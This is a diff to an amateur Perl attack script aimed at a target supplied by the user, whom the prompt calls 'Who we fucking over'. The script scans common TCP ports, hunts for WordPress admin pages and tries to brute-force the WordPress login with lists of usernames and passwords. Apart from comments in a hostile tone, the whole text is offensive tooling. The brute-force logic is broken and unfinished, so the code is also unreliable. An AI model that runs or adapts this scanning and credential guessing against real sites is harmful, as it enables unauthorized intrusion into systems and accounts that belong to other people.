@@ -29,7 +29,6 @@ system('clear');
 #Static Variables
 my @ports = qw(20 21 22 23 53 67 68 69 80 88 135 139 443 445);
 my $conPorts;
-my $errPorts;
 my $sock;
 my $banner = << 'EOL';
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -47,48 +46,41 @@ my $cookie = new HTTP::Cookies(ignore_discard => 1);
 my $bot = LWP::UserAgent->new;
 $bot -> timeout(10);
 $bot -> agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
-$bot -> requests_redirectable => ['GET', 'HEAD', 'POST'];
-$bot -> protocols_allowed => (['http', 'https']);
 $bot -> cookie_jar($cookie);
 #####################################
 print color('yellow');
 print $banner;
-print color('reset');
 print "\n\n[*]Who we fucking over => ";
 chomp(my $host = <STDIN>);
 #print "\n\n[*]Enter the path to the list of usernames => ";
 #chomp(my $user = <STDIN>);
 #print "\n\n[*]Enter the path to the list of passwords => ";
 #chomp(my $pass = <STDIN>);
-print "++++++++++++++++++++++++++++++\n\n";
+
 
 #####################################
 #Info gathering: Port scanner
 sleep(2);
+print "++++++++++++++++++++++++++++++\n\n";
 print "[*]Trying to connect to common ports\n";
 print "++++++++++++++++++++++++++++++\n\n";
+print color('reset');
 sleep(2);
 
+#looks for ports in the array
+#to add: array of open ports
 foreach my $port (@ports){
-  eval {
-    local $SIG{ALRM} = sub { $errPorts++; die; };
-    print "[*]Trying port: ", $port, "\n";
-    if($sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => 'tcp')){
-      if ($port == 80) {
-        my $request = "HEAD / HTTP/1.1\n\n\n\n";
-        print $sock $request;
-        print "\n";
+    if($sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => 'tcp', Timeout => 1)){
+        print color('green');
+        print "[*] =>\tPort $port is open\n";
+        print color('reset');
       }
-      while(<$sock>){
-        chomp;
-        print "   ",$_,"\n";
+      else{
+        print color('red');
+        print "[*] =>\tPort $port is closed\n";
+        print color('reset');
       }
-      print "\n";
-      $conPorts++;
     }
-    close($sock);
-  };
-}
 
 #####################################
 #Running subroutines
@@ -101,31 +93,32 @@ brute_force();
 sub admin_find {
 
  #array of typical admin pages
+ print color('yellow');
  print "++++++++++++++++++++++++++++++++++\n";
  print "[*]Hunting for an admin page\n";
  print "++++++++++++++++++++++++++++++++++\n";
+ print color('reset');
  my @admins = qw(admin administrator wp-admin wp-login.php);
-  if ($host !~ /http:\/\//) {$host = "http://$host";};
+  if ($host !~ /http:\/\//) {$host = "http://$host";}; #adds http before the target if it is not present
 
   foreach my $admin (@admins) {
 	 my $hunt = $host."/".$admin."/";
-	 my $req = HTTP::Request->new(POST=>$hunt);
+	 my $req = HTTP::Request->new(GET=>$hunt); #sends a GET request for the pages
 	 my $res = $bot->request($req);
     #looks for the admin page
    if ($res->is_success) {
       print color('red');
 	    print "[*]Found the admin page!!\n";
-	    print "[*]\t$hunt \n";
+	    print "[*] =>\t$hunt \n";
       print color('reset');
       last;
       return $hunt;
     }
-	  elsif ($res->content=~/Access Denied/){
+	  elsif ($res->content=~/Access Denied/){ #if the admin page is found, but pulls a 403 error, will let the user know
       print "[*]Found the admin page : $hunt => [Error & Access Denied]\n";
       last;
 	  }
 	  else {
-      print "[*]Unable to find the admin page with $hunt\n";
 	  }
   }
 }
@@ -138,9 +131,11 @@ sub brute_force {
   #Names of the username and password input fields on the WordPress admin panel
   my $username = "<input name=log />";
   my $passwordname = "<input name=pwd />";
+  print color('yellow');
   print "++++++++++++++++++++++++++++++++++\n";
   print "[*]Trying to break the login\n";
   print "++++++++++++++++++++++++++++++++++\n";
+  print color('reset');
   #Iterating through the two arrays to try and guess the username and password
   #It sort of does what it is supposed too
   foreach (@users) {
@@ -153,6 +148,9 @@ sub brute_force {
         my $req = HTTP::Request->new(POST=>$res);
         if($bot){
           #figured out the issue, will update ASAP, once I get the code correct
+          #To do:
+          # Add form submission
+          # Add status code checking for status code 304
           unless ($req =~ /Error/ig) {
             print color('red');
             print "[*]Broke dat bitch!\n\t[*]User => " . $user . "\n\t[*]Password => " . $passwd . "\n";
